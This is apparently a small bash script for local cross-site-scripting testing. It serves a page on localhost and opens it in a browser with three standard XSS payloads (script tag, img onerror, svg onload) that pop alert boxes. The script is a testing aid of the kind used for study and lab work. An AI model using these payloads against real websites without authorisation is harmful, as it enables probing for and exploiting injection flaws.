#!/bin/bash

# Config
PORT=8080
TARGET="http://localhost:$PORT/vulnpage.html?q="

# XSS payloads
payloads=(
    "<script>alert('Payload1 executed XSS Found')</script>"
    "<img src='' onerror=alert('Payload2_executed_XSS_Found')>"
    "<svg onload=alert('Payload3_Executed_XSS_Found')>"
)

echo "[*] Starting local Python HTTP server on port $PORT..."
python3 -m http.server $PORT >/dev/null 2>&1 &
SERVER_PID=$!

sleep 2  # wait for server

echo "[*] Launching browser with payloads..."
for p in "${payloads[@]}"; do
    echo ">>> Opening payload in browser: $p"

    # Encode special chars for safe URL
    ENCODED=$(printf %s "$p" | sed -e 's/ /%20/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/"/%22/g' -e "s/'/%27/g")

    # Open in Firefox (change to "google-chrome" if you use Chrome)
    xdg-open "${TARGET}${ENCODED}" >/dev/null 2>&1
    sleep 5   # wait to see popup before next one
done

echo "[*] Stopping server..."
kill $SERVER_PID
